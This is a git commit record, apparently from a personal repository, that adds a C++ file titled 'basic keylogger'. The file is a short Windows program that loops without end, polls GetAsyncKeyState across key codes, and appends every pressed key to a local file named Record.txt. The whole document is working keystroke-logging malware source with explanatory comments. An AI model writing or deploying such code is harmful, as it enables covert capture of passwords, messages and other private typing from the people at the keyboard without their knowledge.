12aea7113af2755fc0526433e8f7cc2856401517
B3TA-BLOCKER <hassaanalibukhari@gmail.com>
2024-05-27 23:06:44 +0500

    basic keylogger

---
+++ main.cpp
@@ -0,0 +1,26 @@
+#include <iostream>
+#include <windows.h>
+#include <winuser.h>
+#include <fstream>
+
+int main(void) {
+    char character;
+
+    for (;;) {
+        for (character = 8; character <= 222; character++) {
+            /*
+                When a key is pressed there is a system interrupt 
+                That interrupt can represent the number 
+                i.e.; 32767
+            */
+            if (GetAsyncKeyState(character) == -32767) {
+                std::ofstream write("Record.txt", std::ios::app); // Use std::ofstream and std::ios::app
+                // ios::app ensures that the file is opened in append mode.
+                write << character;
+                write.close(); // Ensure the file is closed after each write operation
+            }
+        }
+    }
+
+    return 0;
+}
